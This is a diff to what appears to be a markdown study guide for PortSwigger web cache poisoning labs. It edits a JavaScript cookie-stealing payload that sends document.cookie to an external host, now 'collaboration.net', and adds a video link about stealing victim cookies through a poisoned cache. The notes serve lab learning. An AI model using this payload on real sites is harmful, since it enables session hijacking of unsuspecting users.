@@ -126,7 +126,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 ![exploit host tracking.js](images/exploit-host-tracking-js.png)  
   
 ```javascript
-document.location='https://exploit.exploit-server.net/cookies?c='+document.cookie;
+document.location='https://collaboration.net/?cookies='+document.cookie;
 ```  
 
 >Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
@@ -135,6 +135,11 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 [PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
 
+>Youtube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on backend server. The payload is the above JavaScript.  
+
+[YouTube: Web cache poisoning with unkeyed header - cookie stealer](https://youtu.be/eNmF8fq-ur8)  
+  
+  
 [Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
 
 ## Cross Site Scripting
